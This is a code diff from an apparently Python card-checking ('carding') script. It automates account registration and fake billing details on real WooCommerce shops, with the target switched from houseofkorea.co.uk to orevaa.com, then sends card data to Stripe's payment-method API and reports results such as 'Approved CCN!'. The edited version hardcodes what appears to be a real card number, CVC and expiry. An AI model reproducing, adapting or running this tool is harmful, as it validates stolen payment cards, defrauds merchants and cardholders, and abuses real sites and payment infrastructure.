@@ -578,102 +578,110 @@ def fuck(carddddd):
 	coder = requests.session()
 	headers = {
 	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
 	}
-	response = coder.get('https://houseofkorea.co.uk/my-account/payment-methods/', headers=headers)
+	response = coder.get('https://orevaa.com/my-account/', headers=headers)
 	reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-	#################################
+	########
 	headers = {
 	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-	    'origin': 'https://houseofkorea.co.uk',
-	    'referer': 'https://houseofkorea.co.uk/my-account/payment-methods/',
+	    'origin': 'https://orevaa.com',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
 	}
 	data = {
 	    'email': email,
 	    'wc_order_attribution_source_type': 'typein',
-	    'wc_order_attribution_referrer': '(none)',
-	    'wc_order_attribution_utm_campaign': '(none)',
-	    'wc_order_attribution_utm_source': '(direct)',
-	    'wc_order_attribution_utm_medium': '(none)',
-	    'wc_order_attribution_utm_content': '(none)',
-	    'wc_order_attribution_utm_id': '(none)',
-	    'wc_order_attribution_utm_term': '(none)',
-	    'wc_order_attribution_utm_source_platform': '(none)',
-	    'wc_order_attribution_utm_creative_format': '(none)',
-	    'wc_order_attribution_utm_marketing_tactic': '(none)',
-	    'wc_order_attribution_session_entry': 'https://houseofkorea.co.uk/my-account/payment-methods/',
-	    'wc_order_attribution_session_start_time': '2025-06-09 22:52:21',
-	    'wc_order_attribution_session_pages': '1',
+	    'wc_order_attribution_session_entry': 'https://orevaa.com/my-account/',
+	    'wc_order_attribution_session_pages': '11',
 	    'wc_order_attribution_session_count': '1',
-	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
 	    'woocommerce-register-nonce': reg_nonce,
-	    '_wp_http_referer': '/my-account/payment-methods/',
+	    '_wp_http_referer': '/my-account/',
 	    'register': 'Register',
 	}
-	response = coder.post('https://houseofkorea.co.uk/my-account/payment-methods/', headers=headers, data=data)
+	response = coder.post('https://orevaa.com/my-account/', headers=headers, data=data)
+	########
+	headers = {
+	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+	    'referer': 'https://orevaa.com/my-account/edit-address/',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
+	}
+	response = coder.get('https://orevaa.com/my-account/edit-address/billing/', headers=headers)
+	address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
+	#########
+	headers = {
+	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+	    'origin': 'https://orevaa.com',
+	    'referer': 'https://orevaa.com/my-account/edit-address/billing/',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
+	}
+	data = {
+	    'billing_email': email,
+	    'billing_first_name': '3MO',
+	    'billing_last_name': 'Coder',
+	    'billing_country': 'US',
+	    'billing_address_1': '50 Summer St',
+	    'billing_address_2': '',
+	    'billing_state': 'NY',
+	    'billing_city': 'New York',
+	    'billing_postcode': '10080',
+	    'billing_phone': '+15467544789',
+	    'save_address': 'Save address',
+	    'woocommerce-edit-address-nonce': address_nonce,
+	    '_wp_http_referer': '/my-account/edit-address/billing/',
+	    'action': 'edit_address',
+	}
+	response = coder.post('https://orevaa.com/my-account/edit-address/billing/', headers=headers, data=data)
+	##########
+	headers = {
+	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+	    'referer': 'https://orevaa.com/my-account/payment-methods/',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
+	}
+	response = coder.get('https://orevaa.com/my-account/add-payment-method/', headers=headers)
+	key = re.search(r'"key":"(.*?)"', response.text).group(1)
 	nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
-	pk = re.search(r'"key":"(.*?)"', response.text).group(1)
-	########
+	##########
 	headers = {
 	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-	    'referer': 'https://houseofkorea.co.uk/my-account/payment-methods/',
-	}
-	
-	response = coder.get(
-	    'https://houseofkorea.co.uk/my-account/add-payment-method/',
-	    headers=headers,
-	)
-	########
-	headers = {
-	    'accept': 'application/json',
-	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-	    'content-type': 'application/x-www-form-urlencoded',
 	    'origin': 'https://js.stripe.com',
-	    'priority': 'u=1, i',
 	    'referer': 'https://js.stripe.com/',
-	    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-	    'sec-ch-ua-mobile': '?0',
-	    'sec-ch-ua-platform': '"Windows"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
 	}
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F0089f5e1e2%3B+stripe-js-v3%2F0089f5e1e2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhouseofkorea.co.uk&time_on_page=98279&client_attribution_metadata[client_session_id]=c420c59e-e6b3-4096-b08e-2e2e8eec92a4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=d5848c90-3b00-4e8f-8319-abca0d47d3ba0003a1&muid=e61abf1d-187e-499c-ac7a-4d47e3ef0c32ca2604&sid=00187bd1-3d02-498b-8fda-4d66bdf0d983c3dd3c&key={pk}&_stripe_version=2024-06-20'
-	
-	response = coder.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	data = f'type=card&card[number]=5598880304133731&card[cvc]=638&card[exp_year]=29&card[exp_month]=10&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Ffae42e56c7%3B+stripe-js-v3%2Ffae42e56c7%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=555963&client_attribution_metadata[client_session_id]=c8d71aec-c572-47d8-86ea-17d138ecee30&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=edba6518-98ce-48cd-8f58-4fd2dbe09cd7&guid=13f38175-6c1b-481f-9248-6889530773b3c4718f&muid=d21c799a-f058-4db3-8fb2-e41ed7125a399d57f5&sid=eaede906-8bf9-47c0-8db6-c2ff4abf2a5f54358f&key={key}&_stripe_version=2024-06-20'
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	tok = response.json()['id']
 	##########
 	headers = {
-	    'accept': '*/*',
 	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://houseofkorea.co.uk',
-	    'priority': 'u=1, i',
-	    'referer': 'https://houseofkorea.co.uk/my-account/add-payment-method/',
-	    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-	    'sec-ch-ua-mobile': '?0',
-	    'sec-ch-ua-platform': '"Windows"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+	    'origin': 'https://orevaa.com',
+	    'referer': 'https://orevaa.com/my-account/add-payment-method/',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
 	    'x-requested-with': 'XMLHttpRequest',
 	}
-	params = {
-	    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
-	}
+	
 	data = {
-	    'action': 'create_and_confirm_setup_intent',
+	    'action': 'wc_stripe_create_and_confirm_setup_intent',
 	    'wc-stripe-payment-method': tok,
 	    'wc-stripe-payment-type': 'card',
 	    '_ajax_nonce': nonce,
 	}
-	response = coder.post('https://houseofkorea.co.uk/', params=params, headers=headers, data=data)
-	msg=response.text
-	if '"success":true,"data":{"status":"succeeded"' in msg:
+	response = coder.post('https://orevaa.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+	data = response.json()
+	done = data.get('success')
+	error_message = (
+	    data.get('data', {})
+	        .get('error', {})
+	        .get('message')
+	)
+	if done is True or str(done).lower() == 'true':
 	    return 'Your Payment Method Successfully Added.'
+	elif error_message == "Your card's security code is incorrect.":
+	    return 'Approved CCN!'
+	elif error_message:
+	   return error_message
 	else:
-	    return 'Your card has been declined.'
+	    return "Unexpected response structure:", data
 def brchargeeee(card2):
 	def generate_random_numbers():
 	    numbers = f"{random.randint(400000, 599999):010d}"
